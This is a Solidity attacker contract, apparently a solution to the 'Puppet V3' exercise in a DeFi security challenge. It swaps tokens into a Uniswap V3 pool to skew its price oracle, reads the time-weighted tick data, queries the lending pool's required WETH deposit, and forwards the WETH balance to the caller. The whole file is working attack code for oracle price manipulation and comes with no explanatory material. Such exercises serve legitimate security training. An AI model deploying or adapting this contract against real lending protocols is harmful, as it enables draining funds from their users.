// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";

interface IPuppetV3Pool {
  function borrow(uint256 borrowAmount) external;
  function calculateDepositOfWETHRequired(uint256 amount) external view returns (uint256);
}

interface IUniSwapV3SwapCallback {
  function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

contract PuppetV3Attacker is IUniSwapV3SwapCallback {
  IERC20Minimal public immutable weth;
  IERC20Minimal public immutable token;
  IPuppetV3Pool public immutable lendingPool;
  IUniswapV3Pool public immutable v3Pool;
  int56[] public tickCumulatives;

  constructor(address weth_, address token_, address v3Pool_, address lendingPool_) {
    weth = IERC20Minimal(weth_);
    token = IERC20Minimal(token_);
    lendingPool = IPuppetV3Pool(lendingPool_);
    v3Pool = IUniswapV3Pool(v3Pool_);
  }

  function callSwap(int256 amount_) public {
    v3Pool.swap(
      address(this),
      false,
      amount_,
      TickMath.MAX_SQRT_RATIO - 1,
      ""
    );
  }

  function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external override {
    uint256 amount1 = uint256(amount1Delta);
    token.transfer(address(v3Pool), amount1);
  }
  
  function getQuoteFromPool(uint256 amountOut_) public view returns (uint256 amountIn_) {
    amountIn_ = lendingPool.calculateDepositOfWETHRequired(amountOut_);
  }

  function observePool(uint32[] calldata secondsAgos_) public returns (int56[] memory tickCumulatives_, uint160[] memory secondsPerLiquidityCumulativeX128s_) {
    (tickCumulatives_, secondsPerLiquidityCumulativeX128s_) = v3Pool.observe(secondsAgos_);
    tickCumulatives.push(tickCumulatives_[0]);
    tickCumulatives.push(tickCumulatives_[1]);
  }

  function transferWeth() public {
    uint bal = weth.balanceOf(address(this));
    weth.transfer(msg.sender, bal);
  }
}